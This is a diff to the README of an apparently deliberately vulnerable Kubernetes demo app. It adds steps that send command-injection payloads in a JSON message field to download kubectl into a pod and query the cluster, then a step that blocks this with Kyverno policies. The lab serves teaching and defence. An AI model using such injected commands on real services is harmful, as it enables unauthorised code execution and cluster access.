@@ -12,13 +12,34 @@ cd vulnerable-web-stack-kube
 ### Launch the cluster
   
 ```bash
-kubectl apply -f ./k8s
+kubectl apply -f ./k8s/resources
 ```
 
-### Try to
+### Try the vulnerability
+
+Open a shell in the client application and install kubectl
+
+```bash
+curl -X POST -H "Content-Type: application/json" -d '{"message":"hello; curl -LO https://dl.k8s.io/release/$(curl -Ls https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl; chmod +x ./kubectl"}' http://server-service:3000/message
+```bash
+curl -X POST -H "Content-Type: application/json" -d '{"message":"hello; ./kubectl get pods"}' http://server-service:3000/message
+```
+
+We can see that the command is executed inside the pod and that we can reach the kube API
+
+### Protect the cluster with kyverno
+
+```bash
+kubectl apply -f ./k8s/policies
+```
+
+Now ce can't execute command inside the pod
+
+```bash
 
 
-Go to the website at http://localhost:3000. Write a cowsay message and inject a command
+
+### Sign and build the docker images
 
 Sign the images with your docker hub account
 
